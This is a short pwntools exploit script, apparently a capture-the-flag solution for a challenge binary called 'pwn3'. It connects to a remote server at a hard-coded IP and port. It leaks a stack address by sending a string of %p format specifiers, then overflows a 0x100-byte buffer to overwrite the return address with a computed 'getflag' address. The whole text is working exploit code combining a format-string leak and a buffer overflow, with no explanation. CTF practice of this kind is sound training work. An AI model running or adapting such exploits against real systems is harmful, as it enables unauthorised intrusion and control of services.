from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = process('./pwn3')
p = remote('121.89.239.232', 10003)
p.recvuntil("what's your name? ")
p.sendline("%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p")
#p.recvuntil("a10")
main_addr = p.recvuntil("a10")[-14:]
print(main_addr)
main_addr = int(main_addr, 16)
getflag_addr = main_addr - 0x46
p.recvuntil("get flag:")
payload = b'a' * 0x100 + p64(getflag_addr)
p.sendline(payload)
p.interactive()